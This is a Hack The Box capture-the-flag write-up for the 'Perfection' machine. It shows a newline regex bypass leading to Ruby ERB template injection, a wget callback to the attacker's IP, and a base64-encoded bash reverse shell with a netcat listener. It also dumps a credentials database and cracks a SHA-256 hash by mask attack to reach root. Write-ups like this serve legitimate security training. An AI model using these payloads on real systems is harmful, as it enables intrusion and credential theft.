---
layout: post
title: "HTB: Perfection"
box: perfection
img: /img/perfection/perfection
author: Andrew Cherney
date: 2024-07-06
tags: htb easy-box linux webapp ruby john season-4
icon: "assets/icons/perfection.png"
post_description: "Short and simple box. First find a way to inject ruby commands into an online calculator, then find mail with a reference to a password scheme and the corresponding db for cracking to sudo into root."
---

# Summary

{{ page.post_description }}

# Enumeration

```
nmap -oA open_ports.nmap -p- 10.10.11.253 -Pn

Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-08 07:47 CST
Nmap scan report for 10.10.11.253
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
sudo nmap -sC -sV -T4 -O -p22,80 10.10.11.253

Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-08 07:53 CST
Nmap scan report for 10.10.11.253
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80 - http

{% include img_link src="/img/perfection/perfection_front_page" alt="front_page" ext="png" trunc=600 %}

![weighted grades calculator]({{ page.img }}_weight_calculator.png)

Right out the gates we can see this uses WEBrick 1.7.0 and that this calculator portion of the site has a broad attack surface to test. 

![sinatra back end]({{ page.img }}_weighted_calc_backend.png)

Digging into the inspect element it seems the backend is running off of Sinatra. Cursory glances at search engines didn't reveal any pressing vulnerabilities or exploits for either WEBrick or Sinatra so I opted to check the data being sent to the Sinatra endpoint.

Sinatra allows a webdev to define routes and run code or provide web pages as a result. In this case here we are POSTing 5 grades, 5 categories and 5 weights. After testing there is some basic character filtering and the grade/weight values require numeric values. Luckily the category tab could still be vulnerable here.

# User as susan

## Abusing regex

A common staple of these character filters is using regex to define how a provided string should be handled. Typically you might see this from PHP using preg_match [and you can find more in my Zipping POST about that](https://cybercherney.github.io/2024/01/13/HTB_Zipping.html). A common way to fail to sanitize inputs with regex is to start the filtering at the beginning of the string (with ^), and failing to end the string (with $). With the lack of a defined end you can start a new line (%0A) then bypass every character being filtered. 

So to test this hypothesis we can add a simple payload of `category1=aaa%0A'` in category1 and check the return value:

```
</form>
Your total grade is 100%<p>aaa
': 100%</p>
```

Great we can send any characters we want. This webapp is using Ruby as confirmed by Wappalyzer and [https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html) is a place you can look at ways to run commands/code in Ruby. What stood out to me was the `<%= %>` in combination with `system("cmd")` to potentially run commands through Ruby. 

```
final payload

grade1=100&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0&category1=aaa%0A<%25%3d+system("wget+http%3a//10.10.14.3%3a8081/test")+%25>
```

I did get a request on my python server, forgot to grab the output but know this exploit functions as intended. From what I tested the placement of category1 doesn't matter but I placed it at the end for visibility of the exploit. Next I can place a base64 encoded reverse shell and get the user running this ruby site. 

```
command

echo+'YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4zLzc3NzcgMD4mMQ%3d%3d'+|+base64+-d+|+bash
```

```bash
nc -nvlp 7777

Listening on 0.0.0.0 7777
Connection received on 10.10.11.253 57362
bash: cannot set terminal process group (989): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ whoami
whoami
susan
susan@perfection:~/ruby_app$ cat ~/user.txt
cat ~/user.txt
1e4d2c637d3dd6------------------
```

# Root

First things here we can see the user we are is susan and this app is running off of the home directory. In this directory there is also a Migration database with credentials inside.

```bash
susan@perfection:~$ ls
ls
Migration  ruby_app  user.txt
susan@perfection:~$ ls Migration
ls Migration
pupilpath_credentials.db
susan@perfection:~$ strings Migration/*
strings Migration/*
SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```

Additionally we are in the sudo user group. 

```bash
susan@perfection:~/ruby_app$ groups
groups
susan sudo
```

I attempted to crack the password as is but it wasn't in rockyou. The hash type was SHA-256 as identified by [tunnelsup hash-analyzer](https://www.tunnelsup.com/hash-analyzer/). I turned to other places to look since nothing in LinEnum stood out to me. 

That's when I found mail in var/spool for susan referencing the migration database:

```bash
susan@perfection:~/ruby_app$ cat /var/spool/mail/susan
cat /var/spool/mail/susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

With this new format in mind we can attempt to crack this password using hashcat or john. I prefer john as my pentesting happens in a VM and hashcat isn't partial to interfacing with your GPU through a vm. 

To generate passwords for john we can use two methods, a rule or a mask. Rules are placed into a conf file and are used better when we want to reuse them, ie for appending years. Masks in our case can do exactly this one off generation. To define a mask in john we have the option to use regex or their defined method, which the latter is far more appealing. Since we need to go up to 9 digits we need 9 `?d` and john will go through all of the options permitting the password random number is 9 digits long. If we get no hits decrement the digits by 1 and try again. 

```bash
john hash --format=raw-sha256 --mask=susan_nasus_?d?d?d?d?d?d?d?d?d

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
susan_nasus_413759210 (?)
1g 0:00:00:04 DONE (2024-03-08 10:48) 0.2192g/s 22477Kp/s 22477Kc/s 22477KC/s susan_nasus_538859210..susan_nasus_313679210
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

Now we sudo su and get root.

```bash
susan@perfection:~/ruby_app$ sudo su
sudo su
root@perfection:/home/susan/ruby_app# cat /root/root.txt
cat /root/root.txt
cdc3cd64119f--------------------
```
